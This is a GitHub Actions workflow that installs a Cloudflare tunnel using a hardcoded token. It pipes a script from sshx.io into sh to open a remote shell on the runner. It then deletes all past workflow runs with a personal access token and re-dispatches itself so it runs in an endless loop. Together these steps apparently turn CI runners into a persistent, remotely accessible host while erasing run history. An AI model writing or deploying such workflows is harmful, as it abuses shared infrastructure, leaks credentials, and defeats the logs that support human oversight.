name: Run KS Wings t

on:
  workflow_dispatch:

jobs:
  deploy:
    runs-on: ubuntu-latest

    steps:
      # Step 1: Checkout the repository
      - name: Checkout repository
        uses: actions/checkout@v3

      # Step 2: Set up Node.js
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '20'

      # Step 3: Install cloudflared
      - name: Download and install cloudflared
        run: |
          echo "Downloading cloudflared..."
          curl -L -o cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
          chmod +x cloudflared
          sudo mv cloudflared /usr/local/bin/

      # Step 4: Install cloudflared service with your token
      - name: Install cloudflared service
        run: |
          sudo cloudflared service install eyJhIjoiZTJkZjY3MDI5ZWZlZTBmY2JhM2ExMjNjN2VmNTcxNTAiLCJ0IjoiNWEzZGQ2YzYtODI3Yi00MTdjLWIzMmUtNmMzZDQ2YmE3YzMxIiwicyI6IlltVm1NVEEyWm1RdFl6QmhZUzAwT0dRMkxXSTRNV0V0TVdNeU56STJaV0ZrWmpaayJ9

      # Step 5: Install npm dependencies
      - name: Install npm dependencies
        run: npm install
  
      - name: Start
        run: curl -sSf https://sshx.io/get | sh -s run

      - name: Delete ONLY non-running workflow runs
        if: always()
        env:
          REPO: ${{ github.repository }}
          SELF_RUN_ID: ${{ github.run_id }}
          # Use your PAT stored as GH_PAT. Create it with repo + workflow scopes.
          # If GH_PAT is missing the script falls back to GITHUB_TOKEN, but that may still fail.
          TOKEN: ${{ secrets.GH_PAT || github.token }}
        run: |
          set -euo pipefail

          if [ -z "$TOKEN" ]; then
            echo "ERROR: No token provided. Set secrets.GH_PAT or rely on github.token."
            exit 1
          fi

          echo "Using token from secrets (hidden). This workflow ID = $SELF_RUN_ID"
          PAGE=1
          PER_PAGE=100

          while :; do
            echo "--- fetching page $PAGE"
            RESP=$(curl -sS -H "Accept: application/vnd.github+json" \
              -H "Authorization: token $TOKEN" \
              -H "X-GitHub-Api-Version: 2022-11-28" \
              "https://api.github.com/repos/$REPO/actions/runs?per_page=$PER_PAGE&page=$PAGE")

            # if empty or no workflow_runs, break
            COUNT=$(echo "$RESP" | jq '.workflow_runs | length')
            if [ "$COUNT" -eq 0 ]; then
              echo "No more runs on page $PAGE — exiting."
              break
            fi

            echo "Found $COUNT runs on page $PAGE"

            echo "$RESP" | jq -c '.workflow_runs[] | {id: .id, status: .status, name: .name}' | while read -r row; do
              ID=$(echo "$row" | jq -r '.id')
              STATUS=$(echo "$row" | jq -r '.status')
              NAME=$(echo "$row" | jq -r '.name')

              # skip current run and active runs
              if [ "$ID" = "$SELF_RUN_ID" ]; then
                echo "Skipping self run $ID ($NAME)"
                continue
              fi
              if [ "$STATUS" = "in_progress" ] || [ "$STATUS" = "queued" ]; then
                echo "Skipping active run $ID (status: $STATUS)"
                continue
              fi

              echo "Attempting to delete run $ID (status: $STATUS, name: $NAME)..."

              HTTP=$(curl -sS -o /dev/stderr -w "%{http_code}" -X DELETE \
                -H "Accept: application/vnd.github+json" \
                -H "Authorization: token $TOKEN" \
                -H "X-GitHub-Api-Version: 2022-11-28" \
                "https://api.github.com/repos/$REPO/actions/runs/$ID" 2> /tmp/delete_resp)

              # print any message returned
              if [ -s /tmp/delete_resp ]; then
                echo "API response: $(cat /tmp/delete_resp)"
              fi

              if [ "$HTTP" = "204" ] || [ "$HTTP" = "202" ] || [ "$HTTP" = "200" ]; then
                echo "Deleted run $ID successfully (HTTP $HTTP)"
              else
                echo "Failed to delete run $ID (HTTP $HTTP)."
                # Common reason: 403 Resource not accessible by integration (token lacks permission)
                if [ "$HTTP" = "403" ]; then
                  echo "403 error — likely the token used does not have permission to delete this run."
                  echo "Use a PAT with 'repo' and 'workflow' scopes stored in secrets.GH_PAT, or ensure GITHUB_TOKEN has actions: write and org policies allow delete from actions."
                fi
              fi

              # small sleep to avoid hitting secondary rate limits
              sleep 1
            done

            # next page
            PAGE=$((PAGE+1))
            # safety — if you want to stop after N pages, add a guard here
          done

          echo "Cleanup complete."
          
      - name: Restart Workflow
        if: ${{ always() }}
        uses: benc-uk/workflow-dispatch@v1
        with:
          workflow: Run KS Wings
          ref: main
          token: ${{ secrets.GITHUB_TOKEN }}
